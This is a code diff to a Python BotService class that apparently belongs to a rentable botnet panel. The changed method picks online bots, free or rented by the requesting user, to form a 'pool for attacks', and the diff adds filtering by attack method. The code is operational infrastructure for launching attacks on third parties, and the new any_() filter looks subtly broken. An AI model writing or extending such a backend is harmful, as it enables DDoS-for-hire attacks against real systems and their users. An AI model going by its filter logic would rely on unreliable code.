@@ -80,15 +80,17 @@ class BotService:
 
     @staticmethod
     async def get_available_bots(count: int, methods: List[str], user_id: Optional[UUID] = None) -> List[Bot]:
-        """Pool for attacks: online bots free OR rented by this user."""
+        """Pool for attacks: online bots free OR rented by this user, matching at least one method."""
+        from sqlalchemy import any_
         async with async_session() as s:
+            base_cond = [Bot.status == "online"]
             if user_id:
-                q = select(Bot).where(
-                    Bot.status == "online",
-                    or_(Bot.is_rented == False, Bot.rented_by_user_id == user_id),
-                ).limit(count)
+                base_cond.append(or_(Bot.is_rented == False, Bot.rented_by_user_id == user_id))
             else:
-                q = select(Bot).where(Bot.status == "online", Bot.is_rented == False).limit(count)
+                base_cond.append(Bot.is_rented == False)
+            if methods:
+                base_cond.append(Bot.enabled_methods.any(any_(*[m.upper() for m in methods])))
+            q = select(Bot).where(and_(*base_cond)).limit(count)
             result = await s.execute(q)
             return list(result.scalars().all())
 
